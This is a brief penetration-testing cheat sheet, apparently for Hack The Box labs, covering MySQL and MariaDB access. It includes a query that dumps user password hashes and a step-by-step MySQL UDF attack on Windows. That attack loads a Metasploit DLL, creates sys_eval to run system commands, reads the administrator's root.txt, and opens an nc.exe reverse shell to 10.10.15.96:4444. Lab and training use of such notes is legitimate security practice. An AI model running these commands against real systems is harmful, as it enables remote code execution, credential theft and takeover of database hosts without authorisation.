# db-tools
  
## mysql
```
mysql -u <USER> -p '<PASSWORD>' -h 127.0.0.1 <HOSTANME>

mysql -u <USER> -p -h 127.0.0.1 -P 3306

SELECT current_user(), version();
SHOW DATABASES;
USE <db>; SHOW TABLES;
SHOW GRANTS;
USE <db>;
DESCRIBE _htb_staff;
SHOW CREATE TABLE _htb_staff;
SELECT COUNT(*) FROM _htb_staff;
SELECT * FROM _htb_staff LIMIT 5;



```
```
SELECT username, email, password FROM users;
```
or login and get get the users in a 1 liner:
```
mysql -uroot -p'<PASSWORD>' -h127.0.0.1 <HOSTANME> -e "SELECT username, email, password FROM users;"

### User Defined Function RCE in Windows MySQL

1. Root access to SQL
2. Write access to the Plugins directory. E.G. C:\Program Files\MySQL\MySQL Server x.x\lib\plugin
3. Copy the MSF payload to the Plugins directory: 
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
4. mysql -u root -p -h 127.0.0.1 -P 3306
5. CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
6. SELECT CONVERT(sys_eval('whoami') USING utf8mb4);
7. SELECT sys_eval('whoami /priv');
8. Then read a file with: SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');
9. Or rev shell using NC: SELECT sys_eval('C:\\Users\\KioskUser\\Desktop\\nc.exe 10.10.15.96 4444 -e cmd.exe');




```
## dbeaver
  
## mariadb
User table password hashes use Bcrypt.
```
mariadb -uroot -p'<PASSWORD>' -h127.0.0.1 <HOSTANME>
```
